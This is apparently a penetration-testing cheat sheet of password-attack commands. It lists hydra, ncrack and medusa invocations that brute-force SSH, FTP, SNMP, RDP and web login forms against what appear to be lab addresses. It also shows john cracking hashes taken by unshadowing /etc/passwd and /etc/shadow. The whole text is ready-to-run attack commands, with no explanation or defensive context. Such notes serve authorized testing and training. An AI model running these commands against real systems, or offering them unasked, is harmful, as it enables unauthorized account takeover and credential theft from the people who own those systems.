#### hydra

```hydra -P password-file.txt -v 10.11.1.219 snmp```

```hydra -l admin -P password-file.txt -v x.x.x.x ftp```

```hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp```

```hydra -l root -P password-file.txt x.x.x.x ssh```

```hydra -l admin -P /usr/share/dirb/wordlists/small.txt 192.168.1.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V```

```hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.106.145 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V```

-----


#### john

*unshadow /etc/passwd /etc/shadow > /tmp/unshadowed*

```john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/unshadowed```

```john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ntlm.hash```

-----


#### rdp

```ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.35```

```hydra -t 1 -l username -p password1! rdp://192.168.190.130```

-----


#### medusa

```medusa -h 10.11.1.219 -u admin -P password-file.txt -M http -m DIR:/admin -T 10```

-----
